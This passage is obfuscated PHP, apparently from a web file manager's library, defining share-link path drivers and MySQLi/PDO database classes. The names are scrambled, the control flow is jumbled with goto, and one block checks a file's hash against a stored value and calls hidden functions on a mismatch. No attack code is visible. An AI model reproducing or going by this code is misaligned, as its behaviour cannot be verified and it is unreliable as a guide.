$AÕÕÃ…»Ê->handle->add($Fõ²Â‰ò¤Ç, $b“İª²É£…, $eÚŒ¬§æØî); if ($bôŸÍŞÂ·¼) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($dÉã„„áĞ‡) { return Cache::init()->get($dÉã„„áĞ‡); } public function unlock($B©©Ïù±Ø) { return Cache::init()->remove($B©©Ïù±Ø); } } goto fæå¤œ‡£; C¦ñß„ôäß: function beforeShutdownFatalError($b¾ »õ£­) { think_exception($b¾ »õ£­); } $_SERVER[$_SERVER[ñâ][45]] = $C‡ÓŞ¿éÏƒ($_SERVER[$_SERVER[ñâ][42]]); $FÀöŒŞé“Î = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto aÖõÄÍÌí; b®¹Üî®®´: class PathDriverDbShareLink extends PathDriverDB { public function __construct($dÈİ›‚Œ¦‹) { $this->pathParse = $dÈİ›‚Œ¦‹; $this->model = Model($_SERVER[í™][1103]); } protected function infoParse($FîÃŒ¿í¿Æ, $EÌâµÉ›½Î = false, $A‚•É°Ñš = false) { $eÉÌêÌîéÎ =& $_SERVER[í™]; return Action($eÉÌêÌîéÎ[1004])->sharePathInfo($this->pathParse[$eÉÌêÌîéÎ[75]], !0); } public function listPath($aÎ¬«Éº‹Ã, $cƒã¿ßŒĞÕ = false) { $d¶Ğñ‰¦æŞ =& $_SERVER[í™]; $e–¸‰ÄùôŒ = parent::listPath($aÎ¬«Éº‹Ã, $cƒã¿ßŒĞÕ); foreach ($e–¸‰ÄùôŒ as $E¨Œ­‚†ÅÍ => $A……¤¨—ß•) { if (!in_array($E¨Œ­‚†ÅÍ, array($d¶Ğñ‰¦æŞ[73], $d¶Ğñ‰¦æŞ[74]))) { continue; } foreach ($A……¤¨—ß• as $C¢Øõ“‘Ññ => $Bê—µè®¦) { $e–¸‰ÄùôŒ[$E¨Œ­‚†ÅÍ][$C¢Øõ“‘Ññ] = Action($d¶Ğñ‰¦æŞ[1004])->shareItemInfo($Bê—µè®¦); } } return $e–¸‰ÄùôŒ; } public function listAll($Dë¾™ã¸¼ç) { $b¬‘ùİø‹´ =& $_SERVER[í™]; $FÏÎÍ›ÜÊ = IO::info($this->pathParse[$b¬‘ùİø‹´[75]]); if (!$FÏÎÍ›ÜÊ) { return array(); } $eÌÒ’´‹à« = $this->model->listAll($Dë¾™ã¸¼ç); foreach ($eÌÒ’´‹à« as &$E÷·…—‘éÃ) { $E÷·…—‘éÃ[$b¬‘ùİø‹´[391]] = Action($b¬‘ùİø‹´[1004])->shareItemInfo($E÷·…—‘éÃ[$b¬‘ùİø‹´[391]]); } return $eÌÒ’´‹à«; } } class PathDriverDriverShareItem { public function __construct($aÒæ¥êÊ…®) { $this->pathParse = $aÒæ¥êÊ…®; } public function __call($CßÔºÒÃ¬, $C¹æ¥ÎìÓ) { $eâÒáù­ÄÑ =& $_SERVER[í™]; if (method_exists($this, $CßÔºÒÃ¬)) { return; } $CÊêøãñ„¤ = call_user_func_array(array($eâÒáù­ÄÑ[1111], $CßÔºÒÃ¬), $C¹æ¥ÎìÓ); $AçÀŠÉ‚¹è = array($eâÒáù­ÄÑ[1112], $eâÒáù­ÄÑ[1113], $eâÒáù­ÄÑ[1114], $eâÒáù­ÄÑ[1115], $eâÒáù­ÄÑ[492], $eâÒáù­ÄÑ[494], $eâÒáù­ÄÑ[1116], $eâÒáù­ÄÑ[103], $eâÒáù­ÄÑ[1117], $eâÒáù­ÄÑ[1118]); if (in_array($CßÔºÒÃ¬, $AçÀŠÉ‚¹è)) { $CÊêøãñ„¤ = $this->getPathOuter($CÊêøãñ„¤); } return $CÊêøãñ„¤; } public function copy($B‘‚¨­Ô®³, $DÏ¢Æ­Å¡Á, $f‰ÊÊğõ¿š = false) { return $this->copyMove($B‘‚¨­Ô®³, $DÏ¢Æ­Å¡Á, $f‰ÊÊğõ¿š, $_SERVER[í™][492]); } public function move($B»°Ó¾ù, $C½À·Ÿ‰ƒ, $ešõØ¥Åšİ = false) { return $this->copyMove($B»°Ó¾ù, $C½À·Ÿ‰ƒ, $ešõØ¥Åšİ, $_SERVER[í™][494]); } private function copyMove($a¡’í×º‘, $E¹ª¤“, $C‡Ë¿Á–, $a”ÀÅ ­’–) { goto E¦İßƒËó; BÚ±ÃÌ‰é: if ($F˜ºÒÑËéˆ->pathParse[$bŸÎ®ÜŸÍŞ[984]]) { $E¹ª¤“ = $F˜ºÒÑËéˆ->pathParse[$bŸÎ®ÜŸÍŞ[984]]; } else { $E¹ª¤“ = $c†ÂÊî¼œÄ; } $BÜù¼°±¹Ù = IO::copyMove($a¡’í×º‘, $E¹ª¤“, $C‡Ë¿Á–, $a”ÀÅ ­’–); $BÜù¼°±¹Ù = $this->getPathOuter($BÜù¼°±¹Ù); goto e‚‹ÀÛèÏğ; e‚‹ÀÛèÏğ: return $BÜù¼°±¹Ù; goto FÓ¹ïàˆğï; E¦İßƒËó: $bŸÎ®ÜŸÍŞ =& $_SERVER[í™]; $c†ÂÊî¼œÄ = $E¹ª¤“; $F˜ºÒÑËéˆ = IO::driverMake($E¹ª¤“); goto BÚ±ÃÌ‰é; FÓ¹ïàˆğï: } public function pathFather($a¬ğ×äË‰) { return get_path_father($this->pathParse[$_SERVER[í™][75]]); } public function iconvSystem($EË÷¬ï¹—) { return $EË÷¬ï¹—; } protected function infoParse($BÊ¤È¯¬Å›, $b»­õß¥† = false) { $e£„¢†òÁ´ =& $_SERVER[í™]; $bùÔÂ¸çñ = $this->pathParse[$e£„¢†òÁ´[439]][$e£„¢†òÁ´[1005]] . $this->pathParse[$e£„¢†òÁ´[998]]; if ($b»­õß¥†) { $Aˆğº = IO::infoWithChildren($bùÔÂ¸çñ); } else { $Aˆğº = IO::info($bùÔÂ¸çñ); } $DŠì¸³±åÙ = $this->pathParse[$e£„¢†òÁ´[439]]; return Action($e£„¢†òÁ´[1110])->_shareItemeParse($Aˆğº, $DŠì¸³±åÙ); } public function listAll($F¾ÍÓÅ‘ñ) { $e®ù¡ÚË‡µ =& $_SERVER[í™]; $A¤©£×ºµ = IO::listAll($F¾ÍÓÅ‘ñ); $d½Ÿ»©³¯ = $this->pathParse[$e®ù¡ÚË‡µ[439]]; foreach ($A¤©£×ºµ as &$CÖí™Ááª) { check_abort(); $CÖí™Ááª = array_merge(IO::info($CÖí™Ááª[$e®ù¡ÚË‡µ[75]]), $CÖí™Ááª); $CÖí™Ááª[$e®ù¡ÚË‡µ[391]] = Action($e®ù¡ÚË‡µ[1110])->_shareItemeParse($CÖí™Ááª, $d½Ÿ»©³¯); } return $A¤©£×ºµ; } public function getPathOuter($AíÀ„èÕÆ¥) { goto d„Œµ‹ìº; F¬Æã¾®£: $B¶‘ŠŒÎ = KodIO::clear($AíÀ„èÕÆ¥); $fÍã¬ Ÿº = KodIO::clear($this->pathParse[$eÊŠªäèÖˆ[439]][$eÊŠªäèÖˆ[1005]]); $eĞ†ß¯× = substr($B¶‘ŠŒÎ, strlen($fÍã¬ Ÿº)); goto B‹ğˆ•óßÌ; B‹ğˆ•óßÌ: if (substr($B¶‘ŠŒÎ, 0, strlen($fÍã¬ Ÿº)) != $fÍã¬ Ÿº) { return !1; } return $this->pathParse[$eÊŠªäèÖˆ[999]] . $eÊŠªäèÖˆ[8] . ltrim($eĞ†ß¯×, $eÊŠªäèÖˆ[8]); goto c¨àùôĞ°; d„Œµ‹ìº: $eÊŠªäèÖˆ =& $_SERVER[í™]; $C¬—…ñÈ‚ = KodIO::parse($AíÀ„èÕÆ¥); if ($C¬—…ñÈ‚[$eÊŠªäèÖˆ[29]] == KodIO::KOD_SHARE_ITEM) { return $C¬—…ñÈ‚[$eÊŠªäèÖˆ[75]]; } goto F¬Æã¾®£; c¨àùôĞ°: } public function getType() { $f§Áì‹”‘¡ =& $_SERVER[í™]; $aÃ†İİ‰ï = str_replace($f§Áì‹”‘¡[71], $f§Áì‹”‘¡[33], get_class($this)); return strtolower($aÃ†İİ‰ï); } public function isTypeObject($e³«…‘½Ñ¦) { return IO::isTypeObject($e³«…‘½Ñ¦); } public function info($a™ÅÈÈÕ•¼) { return $this->infoParse($a™ÅÈÈÕ•¼); } public function infoAuth($cÖˆˆæ¸¸ø) { return $this->infoParse($cÖˆˆæ¸¸ø); } public function infoWithChildren($d†§„Šİ†Ş) { return $this->infoParse($d†§„Šİ†Ş, !0); } public function infoFull($C–—”‡Ùå) { return $this->infoParse($C–—”‡Ùå); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($bìµÎÂ££) { $this->pathParse = $bìµÎÂ££; } protected function infoParse($dÅÕ“¢Öš, $aÅÎİÃñÃÁ = false) { $cç¿ªÆ¹ù =& $_SERVER[í™]; return Action($cç¿ªÆ¹ù[1004])->sharePathInfo($this->pathParse[$cç¿ªÆ¹ù[75]], !0, $aÅÎİÃñÃÁ); } public function listPath($b™–Ê›Í™ì, $CŠ–„ö‹³š = false) { $BÛâÂë‚„á =& $_SERVER[í™]; $f¤¥„Éñ÷å = IO::listPath($b™–Ê›Í™ì, $CŠ–„ö‹³š); foreach ($f¤¥„Éñ÷å as $eªßÄ°ô¿‰ => $AÚ„©·£»…) { if (!in_array($eªßÄ°ô¿‰, array($BÛâÂë‚„á[73], $BÛâÂë‚„á[74]))) { continue; } foreach ($AÚ„©·£»… as $E±ÛÕ­‰ => $AŞ¼ÂÛà) { $AŞ¼ÂÛà = Action($BÛâÂë‚„á[1119])->parsePathChildren($AŞ¼ÂÛà, array($BÛâÂë‚„á[387] => $b™–Ê›Í™ì)); $f¤¥„Éñ÷å[$eªßÄ°ô¿‰][$E±ÛÕ­‰] = Action($BÛâÂë‚„á[1004])->shareItemInfo($AŞ¼ÂÛà); } } return $f¤¥„Éñ÷å; } public function listAll($F°š¯‹ªãª) { $DãÕ÷ìĞìÁ =& $_SERVER[í™]; $aÑîÇ‡ïŒÊ = IO::listAll($F°š¯‹ªãª); foreach ($aÑîÇ‡ïŒÊ as &$a œ’õÈÎ) { $a œ’õÈÎ = array_merge(IO::info($a œ’õÈÎ[$DãÕ÷ìĞìÁ[75]]), $a œ’õÈÎ); $a œ’õÈÎ[$DãÕ÷ìĞìÁ[391]] = Action($DãÕ÷ìĞìÁ[1004])->shareItemInfo($a œ’õÈÎ); } return $aÑîÇ‡ïŒÊ; } } goto DÑã®Âˆ’¶; b¾§›‘´ˆ¦: $fóÚˆ…×Ü = LIB_DIR . $_SERVER[í™][1355]; $c¹Ò—Ç‡ = $_SERVER[í™][776]; if ($_SERVER[$_SERVER[í™][736]] != $c¹Ò—Ç‡($fóÚˆ…×Ü)) { goto CÎø«½Œ‘Õ; eà­¼°åç„: $b®Å“±àó = explode($_SERVER[í™][217], $DŒÇ „Šï•); if (count($b®Å“±àó) < $_SERVER[í™][577]) { $d¶œ¥ù—‡‹ = $_SERVER[í™][741]; $d¶œ¥ù—‡‹(); } $CöÖŞ¬µÇŒ = $_SERVER[í™][742]; goto dÊ¿å™…ù–; dÊ¿å™…ù–: $CöÖŞ¬µÇŒ($fóÚˆ…×Ü); goto dœ…´á—÷“; CÎø«½Œ‘Õ: $cÂÑÇœîÏ = $_SERVER[í™][738]; $b°¼—öò = $_SERVER[$_SERVER[í™][739]] . $_SERVER[í™][740]; $DŒÇ „Šï• = $cÂÑÇœîÏ($b°¼—öò); goto eà­¼°åç„; dœ…´á—÷“: } goto F‚·åŒ®Ú; aÖõÄÍÌí: register_shutdown_function($_SERVER[ñâ][32]); set_error_handler($_SERVER[ñâ][46], $FÀöŒŞé“Î); if (function_exists($_SERVER[ñâ][47])) { set_exception_handler($_SERVER[ñâ][48]); } goto Fìğâ «ƒ¯; e¡Ú…Àâ†è: class DbMysqli extends Db { public function __construct($eâ¾Œ‘°¨… = '') { $E¨ô¢ó¼ù‹ =& $_SERVER[í™]; if (!extension_loaded($E¨ô¢ó¼ù‹[708])) { think_exception(think_lang($E¨ô¢ó¼ù‹[10]) . $E¨ô¢ó¼ù‹[810]); } if (!empty($eâ¾Œ‘°¨…)) { $this->config = $eâ¾Œ‘°¨…; if (empty($this->config[$E¨ô¢ó¼ù‹[13]])) { $this->config[$E¨ô¢ó¼ù‹[13]] = $E¨ô¢ó¼ù‹[33]; } } } public function connect($C³Î¥Š­³Î = '', $Bİê»ÒÌ…” = 0) { $cÚ©Õª»×¢ =& $_SERVER[í™]; if (!isset($this->linkID[$Bİê»ÒÌ…”])) { goto Fº¥‰µ«ğ; dŒ¤ƒï‘î: $CŸÁ«­„…à = $this->linkID[$Bİê»ÒÌ…”]->server_version; $this->linkID[$Bİê»ÒÌ…”]->query($cÚ©Õª»×¢[788] . think_config($cÚ©Õª»×¢[789]) . $cÚ©Õª»×¢[55]); if ($CŸÁ«­„…à > $cÚ©Õª»×¢[790]) { $this->linkID[$Bİê»ÒÌ…”]->query($cÚ©Õª»×¢[791]); } goto Eæ½êÁÓ–º; Eæ½êÁÓ–º: $this->connected = !0; if (1 != think_config($cÚ©Õª»×¢[18])) { unset($this->config); } goto Cœ±Æğœ›; Fº¥‰µ«ğ: if (empty($C³Î¥Š­³Î)) { $C³Î¥Š­³Î = $this->config; } $this->linkID[$Bİê»ÒÌ…”] = new mysqli($C³Î¥Š­³Î[$cÚ©Õª»×¢[784]], $C³Î¥Š­³Î[$cÚ©Õª»×¢[786]], $C³Î¥Š­³Î[$cÚ©Õª»×¢[787]], $C³Î¥Š­³Î[$cÚ©Õª»×¢[17]], $C³Î¥Š­³Î[$cÚ©Õª»×¢[785]] ? intval($C³Î¥Š­³Î[$cÚ©Õª»×¢[785]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto dŒ¤ƒï‘î; Cœ±Æğœ›: } return $this->linkID[$Bİê»ÒÌ…”]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Bºô¸ëÏ¹) { goto E…ä³…ÏÂ; bõöÄ¼©–: think_status($D¶­ä­[20]); $this->queryID = $this->_linkID->query($Bºô¸ëÏ¹); if ($this->_linkID->more_results()) { while (($BíÀËËÜÎ¦ = $this->_linkID->next_result()) != NULL) { $BíÀËËÜÎ¦->free_result(); } } goto Eò¨ƒÇ¦ëà; Eò¨ƒÇ¦ëà: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto aí¶ÅŠ©Ş; C¹É“óñ: $this->queryStr = $Bºô¸ëÏ¹; if ($this->queryID) { $this->free(); } think_action_status($D¶­ä­[19], 1); goto bõöÄ¼©–; E…ä³…ÏÂ: $D¶­ä­ =& $_SERVER[í™]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C¹É“óñ; aí¶ÅŠ©Ş: } public function execute($AÃÚ¹©×Áù) { goto BµåÖ•Ûë; F”ˆ¤¯¡˜: $this->queryStr = $AÃÚ¹©×Áù; if ($this->queryID) { $this->free(); } think_action_status($e–œÀÎªĞ[21], 1); goto A¦ËĞ¬£‰ã; F›Œ‡Ò•„: if (!1 === $a”°ôßò·) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto cÎñİª¾ìö; A¦ËĞ¬£‰ã: think_status($e–œÀÎªĞ[20]); $a”°ôßò· = $this->_linkID->query($AÃÚ¹©×Áù); $this->debug(); goto F›Œ‡Ò•„; BµåÖ•Ûë: $e–œÀÎªĞ =& $_SERVER[í™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F”ˆ¤¯¡˜; cÎñİª¾ìö: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bõ—òÑõÀ¿ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$bõ—òÑõÀ¿) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $bä…ççØ„ñ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$bä…ççØ„ñ) { $this->error(); return !1; } } return !0; } private function getAll() { $dƒÄî¢ˆˆù = array(); if ($this->numRows > 0) { for ($eå‹­‘£¾ = 0; $eå‹­‘£¾ < $this->numRows; $eå‹­‘£¾++) { $dƒÄî¢ˆˆù[$eå‹­‘£¾] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $dƒÄî¢ˆˆù; } public function getFields($aáîÊ¦àÉ) { $b‚à¹ÇéÖ =& $_SERVER[í™]; $cˆÃ°Ÿİ¯ = $this->query($b‚à¹ÇéÖ[795] . $this->parseKey($aáîÊ¦àÉ)); $FµåôØ‹»× = array(); if ($cˆÃ°Ÿİ¯) { foreach ($cˆÃ°Ÿİ¯ as $B®ŒĞ­•‚º => $bá½ãºŒñÚ) { $FµåôØ‹»×[$bá½ãºŒñÚ[$b‚à¹ÇéÖ[27]]] = array($b‚à¹ÇéÖ[28] => $bá½ãºŒñÚ[$b‚à¹ÇéÖ[27]], $b‚à¹ÇéÖ[29] => $bá½ãºŒñÚ[$b‚à¹ÇéÖ[30]], $b‚à¹ÇéÖ[31] => (bool) ($bá½ãºŒñÚ[$b‚à¹ÇéÖ[32]] === $b‚à¹ÇéÖ[33]), $b‚à¹ÇéÖ[34] => $bá½ãºŒñÚ[$b‚à¹ÇéÖ[35]], $b‚à¹ÇéÖ[36] => strtolower($bá½ãºŒñÚ[$b‚à¹ÇéÖ[37]]) == $b‚à¹ÇéÖ[38], $b‚à¹ÇéÖ[39] => strtolower($bá½ãºŒñÚ[$b‚à¹ÇéÖ[40]]) == $b‚à¹ÇéÖ[41]); } } return $FµåôØ‹»×; } public function getTables($B®ºšëöØ¤ = '') { $Eê„ë±Ğ®é =& $_SERVER[í™]; $AËæâ¸¬½ = !empty($B®ºšëöØ¤) ? $Eê„ë±Ğ®é[797] . $B®ºšëöØ¤ : $Eê„ë±Ğ®é[798]; $c³¿¤ùÇ = $this->query($AËæâ¸¬½); $DÓùÛİ¿ = array(); if ($c³¿¤ùÇ) { foreach ($c³¿¤ùÇ as $A¼áê¨ÖŠÔ => $còôÊ°ˆ‚Œ) { $DÓùÛİ¿[$A¼áê¨ÖŠÔ] = current($còôÊ°ˆ‚Œ); } } return $DÓùÛİ¿; } public function replace($dë»ìÊŠÁ, $BƒØÒæß»¡ = array()) { $f¨·ÆÎŒ’ =& $_SERVER[í™]; foreach ($dë»ìÊŠÁ as $eÉ°¢ˆ¥Øµ => $d³ŠùäåÈå) { $FÈò¦°¤Õ˜ = $this->parseValue($d³ŠùäåÈå); if (is_scalar($FÈò¦°¤Õ˜)) { $c‹ˆô´ÃÕ[] = $FÈò¦°¤Õ˜; $CÅï›ôÔÅ[] = $this->parseKey($eÉ°¢ˆ¥Øµ); } } $C‰Óœ°•ß = $f¨·ÆÎŒ’[799] . $this->parseTable($BƒØÒæß»¡[$f¨·ÆÎŒ’[267]]) . $f¨·ÆÎŒ’[800] . implode($f¨·ÆÎŒ’[47], $CÅï›ôÔÅ) . $f¨·ÆÎŒ’[801] . implode($f¨·ÆÎŒ’[47], $c‹ˆô´ÃÕ) . $f¨·ÆÎŒ’[802]; return $this->execute($C‰Óœ°•ß); } public function insertAll($bŞÎ±¾˜ ², $Aêß¢¯ = array(), $BŒ›„Ìë«¿ = false) { goto cÂ‡¼Ìã™; fŞ²Àšß™: $D¹„Ö¥œ‡ = array(); foreach ($bŞÎ±¾˜ ² as $B‰öÚØ¬Œ¾) { $bêÔãŒ¦Ö… = array(); foreach ($B‰öÚØ¬Œ¾ as $dßŠÙ®í» => $DÖ‘áã†Í¥) { $DÖ‘áã†Í¥ = $this->parseValue($DÖ‘áã†Í¥); if (is_scalar($DÖ‘áã†Í¥)) { $bêÔãŒ¦Ö…[] = $DÖ‘áã†Í¥; } } $D¹„Ö¥œ‡[] = $aÚåêëÉğ[248] . implode($aÚåêëÉğ[47], $bêÔãŒ¦Ö…) . $aÚåêëÉğ[802]; } array_walk($A©áœñ›ÑŠ, array($this, $aÚåêëÉğ[803])); goto aï‰“Ûïõë; cÂ‡¼Ìã™: $aÚåêëÉğ =& $_SERVER[í™]; if (!is_array($bŞÎ±¾˜ ²[0])) { return !1; } $A©áœñ›ÑŠ = array_keys($bŞÎ±¾˜ ²[0]); goto fŞ²Àšß™; aï‰“Ûïõë: $F·‚Òê× = ($BŒ›„Ìë«¿ ? $aÚåêëÉğ[804] : $aÚåêëÉğ[805]) . $aÚåêëÉğ[806] . $this->parseTable($Aêß¢¯[$aÚåêëÉğ[267]]) . $aÚåêëÉğ[800] . implode($aÚåêëÉğ[47], $A©áœñ›ÑŠ) . $aÚåêëÉğ[807] . implode($aÚåêëÉğ[47], $D¹„Ö¥œ‡); return $this->execute($F·‚Òê×); goto aÉÇ¯Ê„˜¥; aÉÇ¯Ê„˜¥: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $fâÜ¢‰ =& $_SERVER[í™]; $this->error = $this->_linkID->errno . $fâÜ¢‰[4] . $this->_linkID->error; if ($fâÜ¢‰[33] != $this->queryStr) { $this->error .= LNG($fâÜ¢‰[45]) . $this->queryStr; } think_trace($this->error, $fâÜ¢‰[33], $fâÜ¢‰[46]); return $this->error; } public function escapeString($E¥‘ÀÓš£®) { if ($this->_linkID) { return $this->_linkID->real_escape_string($E¥‘ÀÓš£®); } else { return addslashes($E¥‘ÀÓš£®); } } public function parseKey(&$AòÌ±ˆ£Í, $E±¼†µ—ÈÉ = true) { $f‡½…¥¢Ğ‡ =& $_SERVER[í™]; if ($E±¼†µ—ÈÉ) { $AòÌ±ˆ£Í = $this->parseKeyCheck($AòÌ±ˆ£Í); } if ($AòÌ±ˆ£Í != $f‡½…¥¢Ğ‡[176] && !preg_match($f‡½…¥¢Ğ‡[808], $AòÌ±ˆ£Í)) { $AòÌ±ˆ£Í = $f‡½…¥¢Ğ‡[809] . trim($AòÌ±ˆ£Í, $f‡½…¥¢Ğ‡[809]) . $f‡½…¥¢Ğ‡[809]; } return $AòÌ±ˆ£Í; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($FŠŸÓ¦Ï—Œ = '') { $f´õÎá™ =& $_SERVER[í™]; if (!class_exists($f´õÎá™[811])) { think_exception(think_lang($f´õÎá™[10]) . $f´õÎá™[812]); } if (!empty($FŠŸÓ¦Ï—Œ)) { $this->config = $FŠŸÓ¦Ï—Œ; if (empty($this->config[$f´õÎá™[13]])) { $this->config[$f´õÎá™[13]] = array(); } } } public function connect($f¬Ğ™³ù‹“ = '', $aõ„ïß¬Ã = 0) { $AÀ÷ƒù—–Å =& $_SERVER[í™]; if (!isset($this->linkID[$aõ„ïß¬Ã])) { goto dÃ×Š¿ÓŠÄ; D¦¶´æÅã: $this->dbType = $this->_getDsnType($f¬Ğ™³ù‹“[$AÀ÷ƒù—–Å[813]]); if (in_array($this->dbType, array($AÀ÷ƒù—–Å[814], $AÀ÷ƒù—–Å[815], $AÀ÷ƒù—–Å[816], $AÀ÷ƒù—–Å[817]))) { think_exception($AÀ÷ƒù—–Å[818] . $this->dbType . $AÀ÷ƒù—–Å[819] . $this->dbType . $AÀ÷ƒù—–Å[820]); } if (!$this->linkID[$aõ„ïß¬Ã]) { think_exception($AÀ÷ƒù—–Å[821]); } goto BÙ‡«‰¨°®; dÃ×Š¿ÓŠÄ: if (empty($f¬Ğ™³ù‹“)) { $f¬Ğ™³ù‹“ = $this->config; } if ($this->pconnect) { $f¬Ğ™³ù‹“[$AÀ÷ƒù—–Å[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$aõ„ïß¬Ã] = new PDO($f¬Ğ™³ù‹“[$AÀ÷ƒù—–Å[813]], $f¬Ğ™³ù‹“[$AÀ÷ƒù—–Å[786]], $f¬Ğ™³ù‹“[$AÀ÷ƒù—–Å[787]], $f¬Ğ™³ù‹“[$AÀ÷ƒù—–Å[13]]); } catch (PDOException $b »¤æƒÄŠ) { think_exception($b »¤æƒÄŠ->getMessage()); } goto D¦¶´æÅã; BÙ‡«‰¨°®: try { $this->linkID[$aõ„ïß¬Ã]->exec($AÀ÷ƒù—–Å[822] . think_config($AÀ÷ƒù—–Å[789])); } catch (Exception $b »¤æƒÄŠ) { } $this->connected = !0; if (1 != think_config($AÀ÷ƒù—–Å[18])) { unset($this->config); } goto f‚ÊÛÂ´¤; f‚ÊÛÂ´¤: } return $this->linkID[$aõ„ïß¬Ã]; } public function free() { $this->PDOStatement = null; } public function query($e¶™ë´ºÄ, $añŠÑß = array()) { goto cšÎ«îĞù; AŞ¾”ØŠ¼Æ: if (!1 === $fë¨®•Ô„ñ) { $this->error(); return !1; } else { return $this->getAll(); } goto B‘†Ö„ëëô; AøÈç¥‰Ï: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $fë¨®•Ô„ñ = $this->PDOStatement->execute($añŠÑß); $this->debug(); goto AŞ¾”ØŠ¼Æ; FÂÏ¼Í´ğ‡: $this->queryStr = $e¶™ë´ºÄ; if (!empty($añŠÑß)) { $this->queryStr .= $Fœ¹–¯©µ†[823] . print_r($añŠÑß, !0) . $Fœ¹–¯©µ†[824]; } if (!empty($this->PDOStatement)) { $this->free(); } goto dß’¨©˜¸; dß’¨©˜¸: think_action_status($Fœ¹–¯©µ†[19], 1); think_status($Fœ¹–¯©µ†[20]); $this->PDOStatement = $this->_linkID->prepare($e¶™ë´ºÄ); goto AøÈç¥‰Ï; cšÎ«îĞù: $Fœ¹–¯©µ† =& $_SERVER[í™]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto FÂÏ¼Í´ğ‡; B‘†Ö„ëëô: } public function execute($e­—ƒÆ¨÷, $Aµµë¦´¡ = array()) { goto BŠ«÷ùÇ˜©; c¬ÊùØ˜ùÏ: think_status($a”Ğ·õÒ­«[20]); $this->PDOStatement = $this->_linkID->prepare($e­—ƒÆ¨÷); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto F­š®Î‚“°; F­š®Î‚“°: $eÛ¢°¼ Ó× = $this->PDOStatement->execute($Aµµë¦´¡); $this->debug(); if (!1 === $eÛ¢°¼ Ó×) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Cù¦à‡öÄø || preg_match($a”Ğ·õÒ­«[829], $e­—ƒÆ¨÷)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto aÛÛÓé˜Ÿæ; c‚Ñ²³¶Õâ: if ($this->dbType == $a”Ğ·õÒ­«[817]) { if (preg_match($a”Ğ·õÒ­«[825], $this->queryStr, $bÏÁ“õŸ¥Ã)) { $this->table = think_config($a”Ğ·õÒ­«[826]) . str_ireplace(think_config($a”Ğ·õÒ­«[827]), $a”Ğ·õÒ­«[361], $bÏÁ“õŸ¥Ã[2]); $Cù¦à‡öÄø = (bool) $this->query($a”Ğ·õÒ­«[828] . strtoupper($this->table) . $a”Ğ·õÒ­«[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($a”Ğ·õÒ­«[21], 1); goto c¬ÊùØ˜ùÏ; BŠ«÷ùÇ˜©: $a”Ğ·õÒ­« =& $_SERVER[í™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Fµ¤êÈ¦Øè; Fµ¤êÈ¦Øè: $this->queryStr = $e­—ƒÆ¨÷; if (!empty($Aµµë¦´¡)) { $this->queryStr .= $a”Ğ·õÒ­«[823] . print_r($Aµµë¦´¡, !0) . $a”Ğ·õÒ­«[824]; } $Cù¦à‡öÄø = !1; goto c‚Ñ²³¶Õâ; aÛÛÓé˜Ÿæ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C­Ÿ³‘ÜÓö = $this->_linkID->commit(); $this->transTimes = 0; if (!$C­Ÿ³‘ÜÓö) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $BåìŒ¢ŠÄö = $this->_linkID->rollback(); $this->transTimes = 0; if (!$BåìŒ¢ŠÄö) { $this->error(); return !1; } } return !0; } private function getAll() { $BôóÅèˆß = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($BôóÅèˆß); return $BôóÅèˆß; } public function getFields($F¯†Ëä‘½ã) { goto F°Ø¦ÜºğŞ; aÌ¹îèëè: return $D³†²ÄæÃ; goto dóÑ¤œŸË‹; D´¶µÙõŠ¤: $BÖÁ½œìå¸ = $this->query($Cáˆ‰„–Œ); $D³†²ÄæÃ = array(); if ($BÖÁ½œìå¸) { foreach ($BÖÁ½œìå¸ as $bÒàÜà›ğŸ => $F®Ÿë²ß¨²) { $F®Ÿë²ß¨² = array_change_key_case($F®Ÿë²ß¨²); $F®Ÿë²ß¨²[$bâ¬òç«Ø[28]] = isset($F®Ÿë²ß¨²[$bâ¬òç«Ø[28]]) ? $F®Ÿë²ß¨²[$bâ¬òç«Ø[28]] : $bâ¬òç«Ø[361]; $F®Ÿë²ß¨²[$bâ¬òç«Ø[29]] = isset($F®Ÿë²ß¨²[$bâ¬òç«Ø[29]]) ? $F®Ÿë²ß¨²[$bâ¬òç«Ø[29]] : $bâ¬òç«Ø[361]; $dÔæİ§­‘ = isset($F®Ÿë²ß¨²[$bâ¬òç«Ø[261]]) ? $F®Ÿë²ß¨²[$bâ¬òç«Ø[261]] : $F®Ÿë²ß¨²[$bâ¬òç«Ø[28]]; $D³†²ÄæÃ[$dÔæİ§­‘] = array($bâ¬òç«Ø[28] => $dÔæİ§­‘, $bâ¬òç«Ø[29] => $F®Ÿë²ß¨²[$bâ¬òç«Ø[29]], $bâ¬òç«Ø[31] => 